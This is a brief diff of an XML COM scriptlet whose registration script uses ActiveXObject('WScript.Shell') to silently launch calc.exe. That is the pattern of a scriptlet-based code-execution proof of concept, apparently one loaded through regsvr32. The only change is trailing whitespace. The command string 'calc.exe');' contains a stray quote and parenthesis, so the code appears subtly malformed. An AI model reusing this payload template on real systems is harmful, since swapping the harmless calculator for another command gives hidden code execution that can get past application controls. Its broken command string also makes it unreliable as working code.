@@ -3,7 +3,7 @@
 	<registration progid="PqYOEI6w" classid="{057b64c8-1107-cda1-3d34-062978395f62}">
 		<script>
 			<![CDATA[ 
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe');", 0);
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe');", 0); 
 			]]>
 		</script>
 	</registration>
